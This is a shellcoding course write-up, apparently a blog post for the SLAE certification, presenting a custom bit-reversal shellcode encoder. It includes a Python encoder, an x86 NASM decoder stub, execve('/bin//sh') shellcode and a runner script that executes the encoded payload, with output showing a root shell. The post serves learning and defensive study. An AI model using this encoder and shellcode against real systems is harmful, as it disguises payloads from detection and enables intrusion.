---
layout: single
title: SLAE Assignment 4 - Reverse Bits Encoder
date: 2020-5-07
classes: wide
header:
  teaser: /assets/images/slae/SHELLCODING32.png
tags:
    - Shellcoding
    - Linux
    - x86
    - SLAE
---

![](/assets/images/slae/SHELLCODING32.png)

## Introduction
This is the fourth post of the SLAE exam assignments serie.  

The goal of this assignement is to create a custom encoding scheme and to use it in a PoC (Proof of Concept) with an execve shellcode.

All the source code for this assignment can be found on my [github repository](https://github.com/skr0x/SLAE/tree/master/Assignment-04-Reverse_bits_encoder)

## Reverse Bits Encoder

### Overview

For this assignment, I've chosen to create a reverse bits encoder, its principle is very simple, it take each byte one after the other and reverse their bits

For example, the hexadecimal number 59 (opcode of 'pop ecx' instruction) is 01011001 in binary, 
so after reversing of its bits, it will become 10011010, or 9A in hexadecimal.

### Implementation

The implementation is also very simple, here is the encoder made with Python :

```python
# Convert the shellcode string into a bytes object
shellcode_b = bytes.fromhex(shellcode.replace('\\x', ''))

# Initialize encoded_shellcode, to store the bytes after encoding
encoded_shellcode = ""

# For each byte of the shellcode
for b in shellcode_b:

    # Convert the byte in a string representing its binary value, 
    # with a fixed size of 8 characters and padding with 0 {:08b}
    #
    # Reverse the string order with the slicing technique [::-1] then append "0b" to it
    # so it can be identified like a valid binary number representation
    #
    # Convert the binary representation string into an integer int(str, base=2)
    #
    # Then convert this integer into a string representation of its hexadecimal value, 
    # size of 2 characters and padding with 0 {:02x}
    #
    # Append "\\x" and add it to the encoded_shellcode string
    #
    encoded_shellcode += "\\x"+"{:02x}".format(int("0b"+"{:08b}".format(b)[::-1], base=2))
```

And here is the decoder stub source code :

```nasm
_start:
    jmp    decoder      ; jmp call 'pop' technique to get the memory address after the call
                        ; this will be the address of the encoded shellcode

decode:
    mov    ebx,[esp]    ; ebx will point the encoded shellcode
    xor    ecx,ecx      ; ecx set to 0
    mov    cl,0x21      ; The encoded shellcode length used for the loop counter
                        ; (will be calculated and inserted in function of the chosen shellcode to execute)

next_byte:
    push   ecx          ; Save the main loop counter on the stack
    mov    cl,0x08      ; Set the ecx to 8, the bit counter

next_bit:
    shr byte [ebx],1    ; Shift the bits of the byte pointed by ebx to the right 
			; and copy the lower bit in the Carry Flag (CF)
    adc    al,al        ; add al with al and the CF, in other words shift all bits to the left (al * 2)
			; and insert the last bit pointed by ebx to the right			
			; So in the end, all the bit of the byte pointed by ebx will be pushed to the right 
			; and inserted in al from the right and moved to the left, in the reverse order

    loop   next_bit     ; Process next bit of current byte 

    mov byte [ebx], al  ; copy the decoded byte at the memory address pointed by ebx
    inc    ebx          ; point ebx to the next encoded shellcode byte

    pop    ecx          ; Pop the main loop counter in ecx
    loop   next_byte    ; Process next byte

    ret                 ; Return to the start of the decoded shellcode

decoder:    
    call   decode       ; Push the memory address of the next instruction to the stack
                        ; And jump to the decoder

; The encoded shellcode will be added here in the python script
```

Then we compile it and extract the shellcode :

```plaintext
root@kali:~# ./compile.sh reverse-encoder
[x] Assembling...
[x] Linking...
[x] Done !

Shellcode : 
"\\xeb\\x17\\x8b\\x1c\\x24\\x31\\xc9\\xb1\\x21\\x51\\xb1\\x08\\xd0\\x2b\\x10\\xc0\\xe2\\xfa\\x88\\x03\\x43\\x59\\xe2\\xf1\\xc3\\xe8\\xe4\\xff\\xff\\xff"
```

And we insert it in the Python script after a little update, 
the ninth byte is the encoded shellcode size, so we need to replace it with {0} and we add {1} at the end, where the encoded shellcode will be.

```python
#!/usr/bin/python3
from ctypes import CDLL, CFUNCTYPE, c_char_p, cast
from sys import argv

libc = CDLL("libc.so.6")

# Max length : 255 bytes
# Execve("/bin//sh", null, null) 
shellcode = "\\x31\\xc9\\xf7\\xe1\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\xb0\\x0b\\xcd\\x80"

#    xor ecx,ecx
#    mul ecx
#
#    push eax
#    push 0x68732f6e
#    push 0x69622f2f 
#
#    mov ebx, esp
#    mov al, 0x0b
#    int 0x80

# Max payload to encode length : 255 bytes
decoder = "\\xeb\\x17\\x8b\\x1c\\x24\\x31\\xc9\\xb1{0}\\x51\\xb1\\x08\\xd0\\x2b\\x10\\xc0\\xe2\\xfa\\x88\\x03\\x43\\x59\\xe2\\xf1\\xc3\\xe8\\xe4\\xff\\xff\\xff{1}"

# Convert the shellcode string into a bytes object
shellcode_b = bytes.fromhex(shellcode.replace('\\x', ''))

# Initialize encoded_shellcode, to store the bytes after encoding
encoded_shellcode = ""

# For each byte of the shellcode
for b in shellcode_b:

    # Convert the byte in a string representing its binary value, 
    # with a fixed size of 8 characters and padding with 0 {:08b}
    #
    # Reverse the string order with the slicing technique [::-1] then append "0b" to it
    # so it can be identified like a valid binary number representation
    #
    # Convert the binary representation string into an integer int(str, base=2)
    #
    # Then convert this integer into a string representation of its hexadecimal value, 
    # size of 2 characters and padding with 0 {:02x}
    #
    # Append "\\x" and add it to the encoded_shellcode string
    #
    encoded_shellcode += "\\x"+"{:02x}".format(int("0b"+"{:08b}".format(b)[::-1], base=2))

# Insert the string representation of the shellcode length hexadecimal value
# And the encoded_shellcode into the decoder payload
payload = decoder.format("\\x" + "{:02x}".format(len(shellcode_b)), encoded_shellcode)

# Convert the payload into a bytes object
payload_b = bytes.fromhex(payload.replace('\\x', ''))

print("Shellcode length : {}".format(len(shellcode_b)))
print("Shellcode with decoder stub length : {}".format(len(payload_b)), end="\n\n")
print("Encoded shellcode :")
print(encoded_shellcode)
print(encoded_shellcode.replace('\\x', ',0x')[1:], end="\n\n")

print("Encoded shellcode with decoder stub :")
print(payload, end="\n\n")

print("Exec shellcode...")

# Execute the payload
c_shell_p = c_char_p(payload_b)

launch = cast(c_shell_p, CFUNCTYPE(c_char_p))

launch()
```

We will test it with an execve shellcode, but we can easily replace it by the shellcode we want.
The only constraint is to not use a shellcode bigger than 255 bytes, because the size is coded on one byte in the decoder.

```plaintext
root@kali:~/Desktop/shared/slae-exam/assignment-04# ./reverse-encoder.py 
Shellcode length : 21
Shellcode with decoder stub length : 51

Encoded shellcode :
\x8c\x93\xef\x87\x0a\x16\x76\xf4\xce\x16\x16\xf4\xf4\x46\x96\x91\xc7\x0d\xd0\xb3\x01
0x8c,0x93,0xef,0x87,0x0a,0x16,0x76,0xf4,0xce,0x16,0x16,0xf4,0xf4,0x46,0x96,0x91,0xc7,0x0d,0xd0,0xb3,0x01

Encoded shellcode with decoder stub :
\xeb\x17\x8b\x1c\x24\x31\xc9\xb1\x15\x51\xb1\x08\xd0\x2b\x10\xc0\xe2\xfa\x88\x03\x43\x59\xe2\xf1\xc3\xe8\xe4\xff\xff\xff\x8c\x93\xef\x87\x0a\x16\x76\xf4\xce\x16\x16\xf4\xf4\x46\x96\x91\xc7\x0d\xd0\xb3\x01

Exec shellcode...
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

And it's the end of this assignement ! :)


***This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
Student ID: PA-14186***
